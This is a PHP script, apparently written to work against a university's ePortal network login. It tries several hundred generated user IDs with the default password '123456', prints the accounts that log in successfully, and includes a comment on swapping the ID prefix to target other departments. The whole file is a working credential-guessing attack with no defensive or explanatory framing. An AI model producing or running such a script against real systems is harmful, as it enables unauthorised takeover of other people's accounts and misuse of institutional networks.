<?php
/**
 * Created by PhpStorm.
 * User: Administrator
 * Date: 2018/6/6
 * Time: 23:27
 */
include "Snoopy.class.php";
$key = "wyy";//其中key可以自行更换例如信工院（xgy）商学院（xxy）文新院（wxy）
$snoopy = new Snoopy();
for($i=100;$i<1000;$i++)
{
$dataname  = "wyy" . "$i" . "w" ;
$url = "http://172.16.0.32:8080/eportal/InterFace.do?method=login";
$post = array(
    'userId' => $dataname,
    'password'=> '123456',
    'queryString'=> 'wlanuserip%3D258f42be96770b1a3b7515d4ba7f75bb%26wlanacname%3D776e154f4e46ba9668906e203954b23a%26ssid%3D%26nasip%3D0d09a1de724f795b5b8c3bae719e0bd7%26snmpagentip%3D%26mac%3D165f87435de4ada94af2e0fd5c58dfac%26t%3Dwireless-v2%26url%3D2c0328164651e2b4f13b933ddf36628bea622dedcc302b30%26apmac%3D%26nasid%3D776e154f4e46ba9668906e203954b23a%26vid%3De78ffb079d8c4624%26port%3D6c0830ff081f0b18%26nasportid%3D5b9da5b08a53a540cc9e73feb8657e7e3cd47eb9bfde05d8f10042acf384a82c',
    'operatorPwd'=>'',
    'operatorUserId'=>'',
    'validcode'=>'',
    'service'=>'',
);


$datanamebase16 = bin2hex("0d09a1de724f795b5b8c3bae719e0bd7_172.25.31.140_" . $dataname);
$url_seccess= "http://172.16.0.32:8080/eportal/success.jsp?userIndex=".$datanamebase16."&keepaliveInterval=0";
$snoopy -> submit($url,$post);
$snoopy -> fetchtext($url_seccess);
$str = $snoopy->results;
if(strpos($str,"Logout")===false){
    echo "";
}else{
    echo $dataname . "\n";
}
$logout = array(
    'userIndex'=>$datanamebase16
);
$url_logout = 'http://172.16.0.32:8080/eportal/InterFace.do?method=logout';
$snoopy->submit($url_logout,$logout);
}



